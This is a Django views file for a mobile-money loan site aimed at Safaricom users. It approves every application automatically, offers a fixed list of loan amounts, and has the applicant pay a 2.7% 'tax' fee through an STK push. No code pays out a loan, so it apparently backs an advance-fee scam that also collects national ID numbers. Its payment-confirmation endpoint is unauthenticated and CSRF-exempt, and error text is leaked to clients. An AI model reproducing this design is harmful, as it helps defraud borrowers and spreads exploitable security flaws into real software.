from rest_framework import viewsets, status, permissions
from rest_framework.decorators import api_view, permission_classes
from rest_framework.response import Response
from .models import User, LoanApplication, LoanOffer, MegaPayTransaction
from .serializers import UserSerializer, LoanApplicationSerializer, LoanOfferSerializer, MegaPayTransactionSerializer
from .utils import initiate_stk_push, check_transaction_status
import math
import re
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt

def index(request):
    return render(request, 'index.html')

def apply(request):
    return render(request, 'apply.html')

def loan_offers(request):
    return render(request, 'loan_offers.html')

def payment(request):
    return render(request, 'payment.html')

def privacy(request):
    return render(request, 'privacy.html')

def terms(request):
    return render(request, 'terms.html')

def contact(request):
    return render(request, 'contact.html')

@api_view(['GET'])
def get_me(request):
    if request.user.is_authenticated:
        serializer = UserSerializer(request.user)
        return Response(serializer.data)
    return Response({"detail": "Not authenticated"}, status=status.HTTP_401_UNAUTHORIZED)

@csrf_exempt
@api_view(['POST'])
def submit_application(request):
    data = request.data
    full_name = data.get('fullName')
    phone_number = data.get('phoneNumber')
    national_id = data.get('nationalId')
    loan_type = data.get('loanType')

    # Validate Safaricom phone number
    phone_regex = r'^(0|254)(7|1)\d{8}$'
    normalized_phone = phone_number
    if phone_number.startswith('0'):
        normalized_phone = '254' + phone_number[1:]
    elif not phone_number.startswith('254'):
        normalized_phone = '254' + phone_number

    if not re.match(phone_regex, normalized_phone):
        return Response({"error": "Invalid Safaricom phone number"}, status=status.HTTP_400_BAD_REQUEST)

    application = LoanApplication.objects.create(
        fullName=full_name,
        phoneNumber=normalized_phone,
        nationalId=national_id,
        loanType=loan_type,
        status='approved'
    )

    return Response({
        "success": True,
        "applicationId": application.id,
        "name": full_name,
        "phone": normalized_phone
    })

@api_view(['GET'])
def get_offers(request):
    application_id = request.query_params.get('applicationId')
    if not application_id:
        return Response({"error": "applicationId is required"}, status=status.HTTP_400_BAD_REQUEST)

    loan_amounts = [5500, 7800, 9800, 11200, 16800, 21200, 25600, 30000, 35400, 39800, 44200, 48600]
    offers = []
    for amount in loan_amounts:
        tax_revenue = math.ceil(amount * 0.027)
        interest_rate = 10
        total_repayment = amount + tax_revenue + math.ceil(amount * 0.1)
        offers.append({
            "amount": amount,
            "interestRate": interest_rate,
            "taxRevenue": tax_revenue,
            "totalRepayment": total_repayment
        })
    return Response(offers)

@csrf_exempt
@api_view(['POST'])
def initiate_payment(request):
    data = request.data
    application_id = data.get('applicationId')
    loan_amount = data.get('loanAmount')
    msisdn = data.get('msisdn')
    reference = data.get('reference')

    try:
        application = LoanApplication.objects.get(id=application_id)
        tax_revenue = math.ceil(loan_amount * 0.027)
        total_repayment = loan_amount + tax_revenue + math.ceil(loan_amount * 0.1)
        
        offer = LoanOffer.objects.create(
            application=application,
            loanAmount=loan_amount,
            taxRevenue=tax_revenue,
            totalRepayment=total_repayment,
            status='pending'
        )

        import logging
        logger = logging.getLogger(__name__)
        logger.info(f"Initiating STK Push: amount={tax_revenue}, msisdn={msisdn}, reference={reference}")
        
        response = initiate_stk_push(tax_revenue, msisdn, reference)
        logger.info(f"MegaPay Response: {response}")
        
        if not response or 'transaction_request_id' not in response:
            error_msg = response.get('errorMessage', 'Invalid response from MegaPay')
            logger.error(f"MegaPay Error: {error_msg}")
            return Response({"success": False, "error": error_msg}, status=status.HTTP_400_BAD_REQUEST)

        transaction = MegaPayTransaction.objects.create(
            offer=offer,
            transactionId=response['transaction_request_id'],
            msisdn=msisdn,
            amount=tax_revenue,
            status='initiated'
        )

        return Response({
            "success": True,
            "transactionId": response['transaction_request_id'],
            "dbId": transaction.id
        })
    except Exception as e:
        import logging
        logger = logging.getLogger(__name__)
        logger.error(f"Payment Initiation Error: {str(e)}")
        return Response({"error": str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['GET'])
def check_status(request):
    transaction_id = request.query_params.get('transactionId')
    import logging
    logger = logging.getLogger(__name__)
    try:
        response = check_transaction_status(transaction_id)
        logger.info(f"Status Check Response for {transaction_id}: {response}")
        
        # MegaPay might return a response that is still pending
        # We need to be careful not to mark it as failed too early
        res_code = response.get('ResponseCode')
        
        status_str = "pending"
        if res_code == 0:
            status_str = "success"
        elif res_code is not None:
            # If there's a code and it's not 0, it might be a real failure
            status_str = "failed"
        
        return Response({
            "success": True,
            "status": status_str,
            "responseCode": res_code,
            "responseDescription": response.get('ResponseDescription'),
            "receipt": response.get('TransactionReceipt')
        })
    except Exception as e:
        logger.error(f"Status Check Error: {str(e)}")
        return Response({"success": True, "status": "pending", "error": str(e)})

@csrf_exempt
@api_view(['POST'])
def confirm_payment(request):
    db_id = request.data.get('dbId')
    try:
        transaction = MegaPayTransaction.objects.get(id=db_id)
        transaction.status = 'success'
        transaction.save()
        return Response({"success": True})
    except Exception as e:
        return Response({"error": str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
